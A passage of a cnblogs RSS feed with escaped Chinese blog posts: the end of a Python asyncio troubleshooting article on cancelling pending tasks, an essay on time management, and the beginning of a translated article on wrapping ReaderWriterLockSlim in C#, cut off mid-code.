    loop.run_forever()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面的代码表面上看没啥问题，我们先看看运行效果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
consumer recv {&lt;span&gt;'&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;784f436cfaf388f611e94ca974e1ffbe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
consumer recv {&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;unid&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;784f436cfaf388f611e94ca974e1ffbe&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;end&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
Task was destroyed but it &lt;/span&gt;&lt;span&gt;is&lt;/span&gt;&lt;span&gt; pending!
task: &lt;/span&gt;&amp;lt;Task pending coro=&amp;lt;HandleMsg.get_msg() done, defined at demo.py:17&amp;gt; wait_for=&amp;lt;Future cancelled&amp;gt;&amp;gt;&lt;span&gt;
..........&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;程序没运行一段时间都会出现上面显示的错误提示，我先看看错误提示的信息：&lt;/p&gt;
&lt;blockquote&gt;

&lt;ol class=&quot;linenums&quot;&gt;&lt;li class=&quot;L2&quot;&gt;&lt;code class=&quot;lang-python&quot;&gt;&lt;span class=&quot;typ&quot;&gt;Task &lt;span class=&quot;pln&quot;&gt;was destroyed but it &lt;span class=&quot;kwd&quot;&gt;is &lt;span class=&quot;pln&quot;&gt;pending&lt;span class=&quot;pun&quot;&gt;!&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/li&gt;
&lt;li class=&quot;L3&quot;&gt;&lt;code class=&quot;lang-python&quot;&gt;&lt;span class=&quot;pln&quot;&gt;task&lt;span class=&quot;pun&quot;&gt;: &lt;span class=&quot;pln&quot;&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;span class=&quot;typ&quot;&gt;Task &lt;span class=&quot;pln&quot;&gt;pending coro&lt;span class=&quot;pun&quot;&gt;=&amp;lt;&lt;span class=&quot;typ&quot;&gt;HandleMsg&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;get_msg&lt;span class=&quot;pun&quot;&gt;() &lt;span class=&quot;pln&quot;&gt;done&lt;span class=&quot;pun&quot;&gt;, &lt;span class=&quot;pln&quot;&gt;defined at demo&lt;span class=&quot;pun&quot;&gt;.&lt;span class=&quot;pln&quot;&gt;py&lt;span class=&quot;pun&quot;&gt;:&lt;span class=&quot;lit&quot;&gt;17&lt;span class=&quot;pun&quot;&gt;&amp;gt; &lt;span class=&quot;pln&quot;&gt;wait_for&lt;span class=&quot;pun&quot;&gt;=&amp;lt;&lt;span class=&quot;typ&quot;&gt;Future &lt;span class=&quot;pln&quot;&gt;cancelled&lt;span class=&quot;pun&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;

&lt;p&gt;上面提示的其实就是我的task 是在pendding状态的时候被destroyed了，代码行数以及调用方法都告诉我们了是在：HandleMsg.get_msg() done, defined at demo.py:17&lt;/p&gt;
&lt;p&gt;其实问题也比较好找，我们为每个unid创建了一个task来处理消息，但是当我们收到每个unid消息的end消息之后其实这个task任务对于我们来说就已经完成了，同时我们删除了我的unid和queue的绑定，但是我们并没有手动去取消这个task。&lt;/p&gt;
&lt;p&gt; &lt;br/&gt;&lt;span&gt;注意：这里我其实也有一个不理解的地方：关于这个task为什么会会destroyed，这个协程里是一个死循环一直在收消息，当queue里面没有消息协程也应该一直在await 地方在等待才对，但是如果我们把收到end消息的那个地方的删除unid和queue的绑定关系不删除，那么这个任务是不会被descroyed。所以没有完全明白这里的机制，如果明白的同学欢迎留言讨论&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;但是即使上面的机制我们有点不是特别明白，我们其实也应该把这个task手动进行cancel的，我们们将上面的代码稍微进行改动如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
async &lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_msg(self):
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
                coroutine_msg &lt;/span&gt;=&lt;span&gt; await self.coroutine_queue.get()
                msg_type &lt;/span&gt;= coroutine_msg.get(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;msg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; msg_type == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
                    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is start&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
                    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;recv unid [%s] is end&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %&lt;span&gt; self.unid)
                    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每个当一个unid收到end消息为结束&lt;/span&gt;
&lt;span&gt;                    await self.handle_manager.del_unid(self.unid)
                    current_task &lt;/span&gt;=&lt;span&gt; asyncio.Task.current_task()
                    current_task.cancel()   &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 手动cancel 当前的当前的task&lt;/span&gt;
        &lt;span&gt;except&lt;/span&gt;&lt;span&gt; CancelledError as e:
            &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unid [%s] cancelled success&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; %self.unid)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里有个问题需要注意就是当我们对task进行cancel的时候会抛出cancelledError异常，我们需要对异常进行处理。官网也对此进行专门说明：&lt;br/&gt;&lt;a href=&quot;https://docs.python.org/3.6/library/asyncio-task.html#coroutine&quot;&gt;https://docs.python.org/3.6/library/asyncio-task.html#coroutine&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;cancel()
Request that this task cancel itself.
This arranges &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; a CancelledError to be thrown into the wrapped coroutine on the next cycle through the event loop. The coroutine then has a chance to clean up &lt;span&gt;or&lt;/span&gt; even deny the request using &lt;span&gt;try&lt;/span&gt;/&lt;span&gt;except&lt;/span&gt;/&lt;span&gt;finally&lt;/span&gt;&lt;span&gt;.
Unlike Future.cancel(), this does &lt;/span&gt;&lt;span&gt;not&lt;/span&gt; guarantee that the task will be cancelled: the exception might be caught &lt;span&gt;and&lt;/span&gt; acted upon, delaying cancellation of the task &lt;span&gt;or&lt;/span&gt; preventing cancellation completely. The task may also &lt;span&gt;return&lt;/span&gt; a value &lt;span&gt;or&lt;/span&gt; &lt;span&gt;raise&lt;/span&gt;&lt;span&gt; a different exception.
Immediately after this method &lt;/span&gt;&lt;span&gt;is&lt;/span&gt; called, cancelled() will &lt;span&gt;not&lt;/span&gt; &lt;span&gt;return&lt;/span&gt; True (unless the task was already cancelled). A task will be marked as cancelled when the wrapped coroutine terminates with a CancelledError exception (even &lt;span&gt;if&lt;/span&gt; cancel() was &lt;span&gt;not&lt;/span&gt; called).
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;h2--&quot;&gt;三、小结&lt;/h2&gt;
&lt;p&gt;虽然还有一些地方不太明白，但是随着用的越多，碰到的问题越多，一个一个解决，可能现在对某些知识还有点模糊，但是至少比刚开始使用asyncio的时候清晰了好多，之前整理的三篇文章的连接如下：&lt;br/&gt;&lt;a href=&quot;https://www.syncd.cn/article/asyncio_article_01&quot;&gt;https://www.syncd.cn/article/asyncio_article_01&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.syncd.cn/article/asyncio_article_02&quot;&gt;https://www.syncd.cn/article/asyncio_article_02&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.syncd.cn/article/asyncio_article_03&quot;&gt;https://www.syncd.cn/article/asyncio_article_03&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;也欢迎加入交流群一起讨论相关内容：948510543&lt;/p&gt;


</description>
<pubDate>Fri, 22 Mar 2019 15:02:00 +0000</pubDate>
<dc:creator>python修行路</dc:creator>
<og:description>一、使用 asyncio 总结 最近在公司的一些项目中开始慢慢使用python 的asyncio, 使用的过程中也是各种踩坑，遇到的问题也不少，其中有一次是内存的问题，自己也整理了遇到的问题以及解决方</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhaof/p/10581972.html</dc:identifier>
</item>
<item>
<title>时间管理是个&quot;伪命题&quot;吗？ - 美码师</title>
<link>http://www.cnblogs.com/littleatp/p/10581746.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/littleatp/p/10581746.html</guid>
<description>&lt;p&gt;长期以来，时间管理一直被认为是&lt;strong&gt;自我管理，团队管理，项目管理&lt;/strong&gt;的既关键又基础的手段，就连笔者本人也一直在崇尚时间管理的理念。&lt;br/&gt;但是这里要讲的，不是什么鬼神方法论。而主要是对长时间以来学习和实践时间管理的一些感想。&lt;/p&gt;
&lt;h2 id=&quot;时间是难以管理的&quot;&gt;时间是难以管理的&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223604112-1997722361.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;以一个简单点例子来说明：&lt;br/&gt;我今天定了一个目标，打算&lt;strong&gt;花半天时间学习一下 vue.js，做一个基础的 mvc 案例&lt;/strong&gt;出来。&lt;br/&gt;那么假设我有4个小时进行学习，于是我会列出下面的一个计划详单：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第一个小时，&lt;strong&gt;阅读官方文档&lt;/strong&gt;，有一个大致理念上的了解；&lt;/li&gt;
&lt;li&gt;第二个小时，&lt;strong&gt;阅读别人的博客案例&lt;/strong&gt;，了解真实用法是怎么做的；&lt;/li&gt;
&lt;li&gt;第三个小时，&lt;strong&gt;设计我的案例&lt;/strong&gt;，完成简单的界面框架，js方法定义；&lt;/li&gt;
&lt;li&gt;第四个小时，&lt;strong&gt;整合 vue.js&lt;/strong&gt;，实现逻辑代码并完成调试。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;好了，看似近乎完美的一个计划。真实执行起来会是怎么样呢？&lt;/p&gt;
&lt;h3 id=&quot;第一个小时&quot;&gt;第一个小时&lt;/h3&gt;
&lt;p&gt;阅读官方文档，由于有中文材料，很快就读完了，顺便还看了下vue的一些周边框架，如 vux 、mui。&lt;/p&gt;
&lt;h3 id=&quot;第二个小时&quot;&gt;第二个小时&lt;/h3&gt;
&lt;p&gt;阅读别人的博客案例，我找了五篇博客，每一篇都不大一样，关键是其中的一些API用法不尽相同，于是产生了疑惑，开始寻求答案。&lt;br/&gt;于是不停翻看 vue 的 api 说明，对比不同版本内 api 的用法。&lt;br/&gt;然后严重的事情发生了，我开始纠结于使用哪个版本进行学习，是使用最稳定的呢？还是用最新的开发版。&lt;br/&gt;那些流行的 UI 框架又是基于哪个版本开发的，我又开始一通乱找，看看那些 vue版本的比较，看看那些vue生态那些优秀的UI框架支持什么版本。&lt;br/&gt;三个小时过去了，我还是没能做出抉择，眼看时间一点点过去，索性不管了，就用最新的吧...&lt;/p&gt;
&lt;h3 id=&quot;第三个小时&quot;&gt;第三个小时&lt;/h3&gt;
&lt;p&gt;不，应该是&lt;strong&gt;第五个小时&lt;/strong&gt;了，我肚子饿了，于是拿起手机叫个外卖，美团上的优惠券好多阿，不管了，先领了再说。&lt;br/&gt;什么？优惠券要指定商家才能使用？于是又检索几家店家...这次，花掉了一个十亿级大表全表扫描的时间，大概是半小时吧。然后，为了保证后面的精神头，花了半小时午睡。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223644087-1540471819.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;第六个小时&quot;&gt;第六个小时&lt;/h3&gt;
&lt;p&gt;我已经确定要用什么版本了。可是问题来了，我应该用什么IDE进行开发呢？WebStorm好像不错，但是听老王说很重量级。IDEA也可以用，但是毕竟是JAVA的工具...&lt;br/&gt;好了，强迫症再次上头，花十分钟安装WebStom并体验了下觉得不舒服，又转而使用IDEA的插件，这时候，四十分钟过去了。&lt;br/&gt;接下来，凭借自己&lt;strong&gt;&quot;强大的抽象思维&quot;&lt;/strong&gt;快速定义好了接口和基础界面，只花了二十分钟！&lt;/p&gt;
&lt;h3 id=&quot;第七个小时&quot;&gt;第七个小时&lt;/h3&gt;
&lt;p&gt;整合 vue.js ，把 vue.js 下载并整合到代码里，接下来完成逻辑代码编写，只花了二十分钟。之后开始调试，但在我的浏览器怎么样也没法调通，于是怀疑是浏览器版本问题，换了chrome/firefox 都还是不行之后，又怀疑是代码写得不对，重新编写代码..一通乱麻之后，才找到真正原因：引入其他框架冲突了..，通过网上介绍的办法解决了问题。&lt;br/&gt;一看手机，一个半小时过去了，距离一开始的计划，我花了两倍的时间！ 而且，我竟然还把外卖的事情给忘了..&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223657848-1173452907.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看，这就是一个跟时间管理有关的例子，不知道你会不会有似曾相识的感觉呢？&lt;br/&gt;所以我想说时间很难管理，本质上或许更多的来源于目标的不清晰、又或是意志力不够坚定、旧的坏习惯使然等等。&lt;/p&gt;
&lt;h2 id=&quot;是什么偷走了时间&quot;&gt;是什么偷走了时间&lt;/h2&gt;
&lt;p&gt;前面的例子，听起来更像是一个强迫症和重度拖延症患者的故事。但是在平时的工作里面，一定会有非常多的事情像洪水一样想要吞噬你的计划。&lt;br/&gt;比如：&lt;/p&gt;
&lt;h4 id=&quot;a.-各种打断式的会议&quot;&gt;A. 各种打断式的会议&lt;/h4&gt;
&lt;p&gt;事实上，有很多的会议都不是必须的，或者说有80%的会议里面，其中80%的时间都是不必要的。&lt;br/&gt;这听取起来好像耸人听闻，但仔细回想你参加过的每一个会议，最终剩余的价值是什么？ 会议纪要！没错，只有会议后的纪要能被记住并使用。&lt;br/&gt;那么会议纪要内容有多少，一般都不多，沟通效率非常高的话，10%的会议时间可能就足够了。&lt;br/&gt;打断式的会议，除了会议本身的时长之外，程序员可能还需要花费一定时间在大脑中做切换，而且这个时间比其他职业会高一些的。&lt;/p&gt;
&lt;h4 id=&quot;b.-缺斤少两的交付&quot;&gt;B. &quot;缺斤少两&quot;的交付&lt;/h4&gt;
&lt;p&gt;关于这点，偏向于指技术债务、或文档债务，技术债务呢，比如你的代码写得太随意，可靠性不好，心想着反正现在也没啥问题，就先这样吧。&lt;br/&gt;但在未来的某些场景下，问题被暴露出来了还是要你来修复(如果你跑路了可能另当别论)。文档债务也很常见，许多开发的不喜欢写文档，其实是懒，那么到后来，&lt;br/&gt;会不断的有人来问你，A是怎么回事，B又是怎么来的.. 烦不胜烦。这些都在你的计划内吗？&lt;br/&gt;一句话，出来混的，始终还是要还的！&lt;/p&gt;
&lt;h4 id=&quot;c.-邮件的魔力&quot;&gt;C. 邮件的魔力&lt;/h4&gt;
&lt;p&gt;当大家都喜欢上发邮件时，你看邮件，总会想要一下子把收件箱的未读邮件全部看完、每一封需要回复的都要回复完。&lt;br/&gt;甚至在干活的时候，是不是也会点开Outlook客户端去检查一下，生怕有漏..&lt;br/&gt;一次次的切换，会导致你不专心、走神，精神及代码质量低下.. 或者，让自己上下班临界时间处理邮件，是个办法。&lt;/p&gt;
&lt;h4 id=&quot;d.-座位上的叨扰&quot;&gt;D. 座位上的叨扰&lt;/h4&gt;
&lt;p&gt;总有些人，会特别喜欢面对面沟通，觉得这样效率是最高的。没错，&quot;你“的效率的确是提高了，但别人呢？&lt;br/&gt;这类现象发生在很多项目经理、产品经理身上，他们脱离技术工作已久，或许已经不会从别人的角度去思考问题了。&lt;br/&gt;那么对于他们来说，日常的工作就是面对面沟通，认为这已经不足为奇了。但对于程序员来说，长期以往可能是个噩梦！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223714553-1800892920.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面的这些，都是我平时工作经历过的东西，而且相信，大多数人也正在经受这样的事情。&lt;br/&gt;可能小团队不会有，大中型企业会有，不善管理的部门很严重...&lt;/p&gt;
&lt;h2 id=&quot;有什么良药&quot;&gt;有什么良药&lt;/h2&gt;
&lt;p&gt;时间管理既然这么难，又有这么多的事情烦扰，那还做什么管理？&lt;br/&gt;我认为，尽管现阶段可能不会有什么包好的方法，但时间管理还是要做，不做，那跟咸鱼有什么分别呢？&lt;br/&gt;《高效能认识的七个习惯》、《番茄工作法图解》都是一些畅销书，为啥畅销，就是因为太多人都希望做好时间管理了。&lt;br/&gt;但光凭看书不行，还得实战、不停的修炼不是？ 那我炼了这么久，有啥心得体会呢？&lt;/p&gt;
&lt;h4 id=&quot;尝试给自己更多的时间尤其是学习类的目标给够预留的部分&quot;&gt;1. 尝试给自己更多的时间，尤其是学习类的目标给够预留的部分。&lt;/h4&gt;
&lt;h4 id=&quot;把目标写下来做分解一条条读一遍看看哪些重要哪些不重要最终只要重要的完成就好了&quot;&gt;2. 把目标写下来做分解，一条条读一遍看看哪些重要哪些不重要，最终只要重要的完成就好了。&lt;/h4&gt;
&lt;h4 id=&quot;认识时间不好管理的现实做好失败的准备尽量消除焦虑&quot;&gt;3. 认识时间不好管理的现实，做好失败的准备，尽量消除焦虑。&lt;/h4&gt;
&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
&lt;p&gt;你是一个重度拖延症患者，还是一个自我管理强人？对于时间管理，你怎么看呢，欢迎留言讨论&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322224256548-761655939.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 22 Mar 2019 14:40:00 +0000</pubDate>
<dc:creator>美码师</dc:creator>
<og:description>长期以来，时间管理一直被认为是 自我管理，团队管理，项目管理 的既关键又基础的手段，就连笔者本人也一直在崇尚时间管理的理念。 但是这里要讲的，不是什么鬼神方法论。而主要是对长时间以来学习和实践时间管理</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/littleatp/p/10581746.html</dc:identifier>
</item>
<item>
<title>【译】最大限度地降低多线程 C# 代码的复杂性 - 楚人Leo</title>
<link>http://www.cnblogs.com/leolion/p/10581723.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/leolion/p/10581723.html</guid>
<description>&lt;p&gt;分支或多线程编程是编程时最难最对的事情之一。这是由于它们的并行性质所致，即要求采用与使用单线程的线性编程完全不同的思维模式。对于这个问题，恰当类比就是抛接杂耍表演者，必须在空中抛接多个球，而不要让它们相互干扰。这是一项重大挑战。然而，通过正确的工具和思维模式，这项挑战是能应对的。&lt;/p&gt;
&lt;p&gt;本文将深入介绍我为了简化多线程编程和避免争用条件、死锁等其他问题而编写的一些工具。可以说，工具链以语法糖和神奇委托为依据。不过，引用伟大的爵士音乐家 Miles Davis 的话：“在音乐中，没有声音比有声音更重要。” 声音间断就产生了奇迹。&lt;/p&gt;
&lt;p&gt;从另一个角度来说，不一定是关乎可以编码什么，而是关乎可以选择不编码什么，因为你希望通过间断代码行产生一点奇迹。引用 Bill Gates 的一句话：“根据代码行数来衡量工作质量就像通过重量来衡量飞机质量一样。” 因此，我希望能帮助开发人员减少编码量，而不是教导开发人员如何编写更多代码。&lt;/p&gt;
&lt;h2&gt;同步挑战&lt;/h2&gt;
&lt;p&gt;在多线程编程方面遇到的第一个问题是，同步对共享资源的访问权限。当两个或多个线程共享对某个对象的访问权限且可能同时尝试修改此对象时，就会出现这个问题。当 C# 首次发布时，lock 语句实现了一种基本方法，可确保只有一个线程能访问指定资源（如数据文件），且效果很好。C# 中的 lock 关键字很容易理解，它独自颠覆了我们对这个问题的思考方式。&lt;/p&gt;
&lt;p&gt;不过，简单的 lock 存在一个主要缺陷：它不区分只读访问权限和写入访问权限。例如，可能要从共享对象中读取 10 个不同的线程，并且通过 System.Threading 命名空间中的 ReaderWriterLockSlim 类授权这些线程同时访问实例，而不导致问题发生。与 lock 语句不同，此类可便于指定代码是将内容写入对象，还是只从对象读取内容。这样一来，多个读取器可以同时进入，但在其他所有读写线程均已完成自己的工作前，拒绝任何写入代码访问。&lt;/p&gt;
&lt;p&gt;现在的问题是：如果使用 ReaderWriterLock 类，语法就会变得很麻烦，大量的重复代码既降低了可读性，又随时间变化增加了维护复杂性，并且代码中通常会分散有多个 try 和 finally 块。即使是简单的拼写错误，也可能会带来日后有时极难发现的灾难性影响。 &lt;/p&gt;
&lt;p&gt;通过将 ReaderWriterLockSlim 封装到简单的类中，这个问题瞬间解决，不仅重复代码不再会出现，而且还降低了小拼写错误毁一天劳动成果的风险。图 1 中的类完全基于 lambda 技巧。可以说，这就是对一些委托应用的语法糖（假设存在几个接口）。最重要的是，它在很大程度上有助于实现避免重复代码原则 (DRY)。&lt;/p&gt;
&lt;p&gt;图 1：封装 ReaderWriterLockSlim&lt;/p&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Synchronizer&amp;lt;TImpl, TIRead, TIWrite&amp;gt; &lt;span&gt;where&lt;/span&gt;&lt;span&gt; TImpl : TIWrite, TIRead {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     ReaderWriterLockSlim _lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ReaderWriterLockSlim ();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;    TImpl _shared;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Synchronizer (TImpl shared) {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;         _shared =&lt;span&gt; shared;
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Read (Action&amp;lt;TIRead&amp;gt;&lt;span&gt; functor) {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;        _lock.EnterReadLock ();
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;            functor (_shared);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;            _lock.ExitReadLock ();
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; 
&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Write (Action&amp;lt;TIWrite&amp;gt;&lt;span&gt; functor) {
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;        _lock.EnterWriteLock ();
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;            functor (_shared);
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;            _lock.ExitWriteLock ();
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;图 1 中只有 27 行代码，但却精妙简洁地确保对象跨多个线程进行同步。此类假定类型中有读取接口和写入接口。如果由于某种原因而无法更改需要将访问权限同步到的基础类实现，也可以重复模板类本身三次，通过这种方式使用它。基本用法如图 2 所示。&lt;/p&gt;
&lt;p&gt;图 2：使用 Synchronizer 类&lt;/p&gt;
&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IReadFromShared {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetValue ();
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IWriteToShared {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;void&lt;/span&gt; SetValue (&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value);
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MySharedClass : IReadFromShared, IWriteToShared {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _foo;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; 
